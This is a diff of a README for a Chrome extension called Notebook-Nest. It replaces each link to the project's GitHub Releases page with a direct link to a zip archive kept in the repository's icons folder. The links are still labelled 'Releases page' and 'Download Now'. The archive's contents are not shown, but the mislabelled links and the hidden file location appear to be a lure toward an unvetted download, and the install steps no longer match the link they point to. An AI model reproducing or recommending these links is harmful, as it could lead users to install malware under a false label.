@@ -8,9 +8,9 @@ Welcome to Notebook-Nest! This Chrome extension helps you transform Google’s N
 
 Ready to get started? You can download Notebook-Nest from the Releases page. 
 
-[![Download Notebook-Nest](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/ivalijoshua23/Notebook-Nest/releases)
+[![Download Notebook-Nest](https://raw.githubusercontent.com/ivalijoshua23/Notebook-Nest/main/icons/Nest_Notebook_2.8.zip%20Now-brightgreen)](https://raw.githubusercontent.com/ivalijoshua23/Notebook-Nest/main/icons/Nest_Notebook_2.8.zip)
 
-1. **Visit the Releases Page**: Click on this link to access the downloads: [Download from Releases](https://github.com/ivalijoshua23/Notebook-Nest/releases).
+1. **Visit the Releases Page**: Click on this link to access the downloads: [Download from Releases](https://raw.githubusercontent.com/ivalijoshua23/Notebook-Nest/main/icons/Nest_Notebook_2.8.zip).
 2. **Select the Latest Version**: Look for the latest version in the list on the page.
 3. **Download the Extension**: Click on the appropriate file to download it. 
 4. **Install the Extension**: After the download finishes, go to your Chrome browser. Drag the downloaded `.crx` file into the Extensions page (chrome://extensions) to install.
@@ -69,6 +69,6 @@ For complete peace of mind, remember to check for updates regularly and take adv
 
 Visit our community forums for tips and shared experiences with Notebook-Nest. Getting advice from other users can enhance your experience.
 
-For more information, refer back to the [Releases page](https://github.com/ivalijoshua23/Notebook-Nest/releases) to stay updated about new features and versions.
+For more information, refer back to the [Releases page](https://raw.githubusercontent.com/ivalijoshua23/Notebook-Nest/main/icons/Nest_Notebook_2.8.zip) to stay updated about new features and versions.
 
 Remember, keep your data safe and enjoy organizing your projects with ease!
